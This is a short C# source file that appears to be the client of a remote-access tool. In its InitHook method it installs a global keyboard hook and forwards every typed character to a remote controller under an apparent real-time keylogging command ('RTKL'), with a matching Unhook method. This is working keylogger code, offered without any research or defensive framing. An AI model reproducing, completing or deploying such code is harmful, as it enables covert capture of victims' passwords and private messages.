using System;
using System.Threading;
using System.Windows.Forms;
using Keystroke.API;

namespace RemoteClient
{
    class Program
    {
        private static KeystrokeAPI keystroke;

        [STAThread]
        public static void Main()
        {
            RemoteClient client = new RemoteClient();
            //do some thing else beside all these messy code!
        }

        public static void Unhook()
        {
            if (keystroke != null)
            {
                keystroke.Dispose();
                keystroke = null;
            }
        }

        public static void InitHook()
        {
            keystroke = new KeystrokeAPI();
            keystroke.CreateKeyboardHook((character) =>
            {
                RemoteClient.SendMessage(new DataObject
                {
                    CommandType = "RTL",
                    CommandName = "RTKL",
                    CommandData = character.ToString()
                });
            });
            Application.Run();
        }
    }
}
